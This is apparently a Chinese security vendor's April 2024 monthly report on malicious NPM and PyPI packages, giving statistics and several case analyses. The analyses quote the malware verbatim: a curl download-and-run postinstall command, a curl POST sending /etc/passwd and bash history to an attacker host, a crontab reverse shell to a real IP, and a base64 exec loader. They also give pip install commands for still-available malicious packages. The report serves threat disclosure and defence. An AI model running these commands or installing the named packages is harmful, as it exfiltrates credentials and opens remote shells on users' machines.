---
title: 供应链投毒预警 | 开源供应链投毒202404月报发布（含投毒案例分析）
url: https://mp.weixin.qq.com/s?__biz=MzA3NzE2ODk1Mg==&mid=2647790714&idx=1&sn=837e57de9527798408f754c126f94348&chksm=87709c2db007153be3a796d2b86def212521e4bce9721d86c9f3a2c1a298b3498f3d9931a43e&scene=58&subscene=0#rd
source: 悬镜安全
date: 2024-05-16
fetch_date: 2025-10-06T17:17:42.308213
---

# 供应链投毒预警 | 开源供应链投毒202404月报发布（含投毒案例分析）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgPMfzKqgUPIlqmg9lJo6SptxIpcfkIHJ6xRe4yd33Q2of66cp8hAp1kUF2qU1DMaKUUowMeVs6zQ/0?wx_fmt=jpeg)

# 供应链投毒预警 | 开源供应链投毒202404月报发布（含投毒案例分析）

悬镜安全情报中心

悬镜安全

![](https://mmbiz.qpic.cn/mmbiz_gif/KOWJ2ib68IGgALRzA4dxvk3TIxjvYl6iaZYTLlFC0WhuKC0ogplsM3dbjcqyicYMDyQWMsI3RiawC0PfeERBeMiaIzg/640?wx_fmt=gif)

**概述**

悬镜供应链安全情报中心通过持续监测全网主流开源软件仓库，结合程序动静态分析方式对潜在风险的开源组件包进行动态跟踪和捕获，发现大量的开源组件恶意包投毒攻击事件。在2024年4月份，悬镜供应链安全情报中心在NPM官方仓库（https://www.npmjs.com/）和Pypi官方仓库（https://pypi.org/）上共捕获772个不同版本的恶意组件包，其中NPM仓库投毒占比接近89%， Pypi仓库投毒占比11%；Pypi官方仓库经历3月份遭受集中式投毒后，对新发布组件包进一步加强审查力度，本月Pypi恶意投毒攻击呈现大幅下降趋势。

![](https://mmbiz.qpic.cn/mmbiz_png/KOWJ2ib68IGgPMfzKqgUPIlqmg9lJo6SpNOl6WItObsWBPJ6I7ic959al6B67RuIpEAc9PQDzPcF2hIeoKbyZrtg/640?wx_fmt=png&from=appmsg)

4月份恶意组件数量及仓库分布

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprDs7T6yeckjo0MFiadEmZQRNu7v2TiciaRZl43sIGeLUsFUficqnnSwrFMA/640?wx_fmt=png&from=appmsg)

4月份恶意组件每日统计

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprwxeEH8ibcib9GdiaIBPpVENPDzUKh31ibjWuXEKD2rpCYVkeuaL4S4xAJA/640?wx_fmt=png&from=appmsg)

4月份恶意组件态势统计

针对4月份捕获的恶意投毒组件，我们结合静态规则扫描、源代码审计、动态行为监控等方式进行多方位分析，总结统计投毒组件的攻击方式和恶意行为标签。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgPMfzKqgUPIlqmg9lJo6Spx6u0Cv4wp84shj4sWGMNyBDMKazSBbGzibjSkpl4pOQic67LpoRicgpwQ/640?wx_fmt=jpeg&from=appmsg)

攻击方式统计

投毒组件攻击方式主要包括：

* 恶意文件执行
* 恶意文件下载
* 代码混淆执行
* 恶意文件释放
* Shell命令执行

其中，投毒者最常用的攻击方式依旧是恶意文件执行（84.25%），其攻击流程是利用开源组件包管理器中的自定义指令来执行隐藏在组件安装包中的恶意文件。此外，恶意文件远程下载执行（8.64%）、恶意代码混淆（4.81%）、恶意文件释放执行（1.2%）以及Shell命令执行（1.09%）都是攻击者惯用的投毒手段。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KOWJ2ib68IGgPMfzKqgUPIlqmg9lJo6Sp6B0OWVrdAp90u90nRGxoqrVcKBZaHE0Nxc48d0uS6PQ97rFBKlzHoQ/640?wx_fmt=jpeg&from=appmsg)

恶意行为统计

在4月份捕获的恶意投毒组件中，信息窃取攻击占比高达93%，其中系统基础信息、系统密码文件、系统日志、用户信息、网络配置、DNS服务器IP、浏览器Cookie及登录凭证等敏感信息是攻击者的主要窃取目标。值得关注的是，Pypi仓库发生多起CStealer窃密后门以及挖矿后门投毒；其次，通过远控木马和反向Shell后门进行远控投毒的攻击呈现逐步上涨趋势。相较于3月份，针对数字钱包应用的攻击有较大幅度减少。

**投毒案例分析**

本节将从4月份捕获的开源组件恶意包中选取部分具有代表性的投毒样本进行分析、还原投毒攻击细节。

***Part 1***

### **系统信息外传**

4月15~16号，攻击者在Pypi官方仓库发布多个包名为rhermann相关的恶意包（包括rhermann、rhermann-ct、rhermann-sdsm以及rhermann-sds）。这些恶意包具有相同的攻击代码以及相同的高版本号（99.0），可推断攻击者尝试进行包依赖混淆（Dependency Confusion）供应链投毒。

恶意代码直接植入在Python安装包setup.py中，当包管理器下载安装这些恶意Python包时，恶意代码优先触发执行。恶意代码主要负责收集并外传受害者系统的版本信息、主机名、用户名、本地网络配置、DNS解析配置、主机IP等敏感数据（如下图所示）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpra6mdiamtTCrbIEM6xQCLsRxhWc660aj3yb6jZUCGfgqq7uDQzStSWbg/640?wx_fmt=png&from=appmsg)

收集到的系统敏感信息将被外传给攻击者控制的服务接口：https://pypi-index.org/process\_data

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprSNsGCq3KFRW5syT55rX2w8VJ90C7peT2sCvjticKTwvTAFQAPDliaoEg/640?wx_fmt=png&from=appmsg)

该恶意域名pypi-index.org与Pypi官方域名相比具备一定迷惑性，注册时间为2024年4月10号。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprYXKsSRyTq0LJP2Y2uGl63C3RQAhE3oEB2RUWxnC6cTiaUhvk9fsw5cg/640?wx_fmt=png&from=appmsg)

截止目前，国内部分Python镜像源仍缓存这些恶意包，其Pypi官方包下载量为758次。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpraXWA3kDviaLTMwGnoPBTsFJ5XxkIR8JcjZIpmXA7U1PBGXUwNXjibBIg/640?wx_fmt=png&from=appmsg)

以rhermann为例，目前该恶意Py包仍可从国内主流Pypi镜像源(清华大学、腾讯云等)下载安装，因此潜在的受害者数量可能会更多。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpr725bKZJJ2oRujtJmU2EsKprOd6jDOZkibLMMSlaecoDq7A3WqHWp0iaA/640?wx_fmt=png&from=appmsg)

以国内清华大学镜像源为例，可通过以下命令测试安装该恶意组件包。

```
pip3 install rhermann -i https://pypi.tuna.tsinghua.edu.cn/simple
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpry2Nia35Lxia4EWqjhDra97loK6asvNUrKsicgmlFGiauHGgMYaYJHic0Vxg/640?wx_fmt=png&from=appmsg)

***Part 2***

### **恶意Shell命令执行**

4月2号，攻击者在NPM官方仓库发布包名为monopulips的恶意NPM组件。在组件安装包的模块描述文件package.json中，通过定义postinstall指令在安装过程中执行恶意bash命令。

```
bash -c 'curl -sSL https://research20934i.sherlockshat007.workers.dev -o script.sh && chmod +x script.sh && ./script.sh && rm -f script.sh'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprh9QEHic5z7f6ibJScdeVQTYjWwbaP4NrNkrib8kiblEMwGQK1b7ys44bQQ/640?wx_fmt=png&from=appmsg)

恶意bash命令通过curl从攻击者服务器(https://research20934i.sherlockshat007.workers.dev)拉取第二阶段恶意bash脚本（script.sh）受害者系统上执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprfmO5rK5GbJ1vCpAaNZbhBcXVkoibsYjMtJSIubL4CcOaYZicLibSMdVlQ/640?wx_fmt=png&from=appmsg)

第二阶段bash脚本内容如上所示，其内嵌了一段编码后（先base64编码再字符串反转）的bash脚本代码，进一步解码后获取第三阶段真实的恶意bash代码解码（如下所示），其主要目的是将系统密码文件/etc/passwd、bash历史文件~/.bash\_history 外传到攻击者服务器（https://8b53a8d8a1c2.sherlockshat007.workers.dev）

```
curl -X POST -H "Hostname: $(hostname)" -H "packagetype: NPM" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "Install Directory: \n $(ls -la) \n Security Groups: \n $(id) \n User Directory: \n $(ls ~)\n etc-passwd: \n $(cat /etc/passwd ) \n Installed NPM modules: \n $(npm ls)\n bash history: \n $(cat ~/.bash_history)" -H "secureforward: lksadf8q3elk39" -H "Content-Type: text/plain" https://8b53a8d8a1c2.sherlockshat007.workers.dev
```

此外在4月4号，我们在Pypi仓库捕获到的恶意Python包lyft-core（版本号999.3.9）通样也使用以上极为相似的恶意bash代码进行投毒攻击（如下所示）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprYb3RKVCruGtAKDe9bXYf7DVGyplZ3ib71R6xsntWTuz8qB9RHjwVDkQ/640?wx_fmt=png&from=appmsg)

***Part 3***

### **反向Shell后门**

4月4~7号，投毒者在Pypi官方仓库投放2个伪装成知名Python UserAgent解析库（user-agents）的恶意包（user-agents-parser和user-agents-parsers），这两个恶意包内置了包含Linux反向Shell后门代码的Python模块user-agents。当安装这些恶意包时，恶意包会释放出后门user-agents模块，并替换掉受害者系统环境中原有user-agents模块，实现Python模块投毒。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpr8S6lPQBX2EMPzYjxSBicNI4qJRxWic5DIQwr2yoOxaWibdWZsCe8a3YoA/640?wx_fmt=png&from=appmsg)

以user-agents-parser为例，在2.2.2版本安装包中，user-agents/parsers.py在文件末尾包含恶意代码（如下图所示）。

```
__import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1")
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprm5Axicmiaxicgqn6zhug8fwLFdf1tc1kkFwmuCyNOD5rYuZFtLoVXm9RQ/640?wx_fmt=png&from=appmsg)

恶意代码通过linux crontab将反向Shell后门写入linux计划任务，尝试实现后门持久化。如果受害者系统为Linux系统，系统bash shell将反弹到投毒者服务器（95.179.177.74:1337）上，投毒者可对受害者系统进行远程Shell后门控制。

截止目前，这两个恶意Python包总下载量为904次。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprTdUjLNicRTG424ULhuVlK4ccbY4YPhmMvxuPK6Ja190FnUyvTM6QeEA/640?wx_fmt=png&from=appmsg)

以user-agents-parsers为例，目前该恶意Py包仍可从国内主流Pypi镜像源(清华大学、腾讯云等)下载安装。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprzgWY19Nib5cLVRcnMTCx1IUsl3BQiaUYoaoZl83VLtkbJ00q9Dc7kYwA/640?wx_fmt=png&from=appmsg)

以国内清华大学镜像源为例，可通过以下命令测试安装该恶意组件包。

```
pip3 install user-agents-parsers -i https://pypi.tuna.tsinghua.edu.cn/simple
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprOiaCpF0wICic5TRiag5jiaC4iaYXU74xYhBYufmWpjPRMNCANy7BmWJOmDg/640?wx_fmt=png&from=appmsg)

***Part 4***

### **CStealer后门**

4月25~26号, 悬镜供应链安全情报中心在Pypi官方仓库中捕获14个伪装http客户端开展CStealer窃密后门攻击的投毒包，涉及multiplerequests、multihttp以及multihttps。这些恶意包主要针对Windows平台Python开发者，恶意包在安装时会远程加载CStealer后门到受害者系统上执行，该后门会窃取受害者系统敏感信息、主流浏览器隐私数据、数字货币钱包应用数据以及系统屏幕截屏等。此外，后门还会尝试驻留Windows系统启动目录实现开机自启动。

以multihttps恶意包2.32.5版本为例，当Python开发者使用pip install从Pypi官方仓库或下游镜像源直接安装或依赖引用恶意组件包时，将触发执行Python安装包setup.py中第一阶段恶意代码（如下图所示）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprToHnVL9OcVFn3bfF9vH19R9ENYocLP3sBuQtUDYeOQegorx2Mv5JNw/640?wx_fmt=png&from=appmsg)

第一阶段恶意代码进一步从投毒者服务器上拉取第二阶段恶意代码并执行。

```
from urllib import requestpackage_url = "https://frvezdffvv.pythonanywhere.com/getpackage"package_name = request.urlopen(package_url).read()exec(base64.b64decode(package_name))
```

第二阶段恶意代码经过base64编码，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxprou9QabSdia9X2khJdo3Vu7bibliahZrkicryRT3ibHOBsaLicPGTe8VoY82g/640?wx_fmt=png&from=appmsg)

Base64解码后还原出真实的第二阶段恶意代码，如下所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8VA6VEdgJoFtvQhy79mlyqGKhUibnFxpr41k9Hvmib619c5YCO...